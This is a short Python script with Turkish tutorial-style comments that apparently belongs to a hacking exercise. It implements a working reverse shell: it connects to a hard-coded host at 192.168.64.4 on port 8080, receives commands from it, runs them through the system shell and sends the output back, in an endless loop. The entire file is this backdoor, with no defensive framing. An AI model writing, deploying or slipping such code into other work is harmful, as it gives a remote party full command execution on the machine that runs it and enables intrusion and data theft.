import socket
import subprocess

def command_execution(command):
    return subprocess.check_output(command, shell=True)
    #call dersek direkt çalıştırır ancak check_output calıştırdığında sonucu döndürür
    #komutu içersine hem liste hem de string içersinde verebiliriz


#socket instancesi oluşturuyoruz
#ağ ailesini ve hangi yolla transfer edeceğimiz
my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
my_connection.connect(("192.168.64.4",8080))#ip adresini ve portu tuple olarak vereceğiz

my_connection.send(("Connection OK\n").encode("utf-8"))

while True:
    command =my_connection.recv(1024)#bağlantımdan bir veri alacağımı belirtirim 
    #içersinde kaç bytelık olacağını yazıyoruz
    #1024'ün çok üstünde veya altında almamız olumsuz sonuçlar doğurabilir

    command_output = command_execution((command).decode("utf-8"))
    #komutu çalıştırmak için fonksiyonumuzu cağırıyoruz
    #sonucunu bir değişkene kaydediyoruz  diğer bilgisayarımıza yollamamız gerekiyor
    my_connection.send(command_output)#karşı bilgisayara sonucu gönderdiğimiz yer




my_connection.close()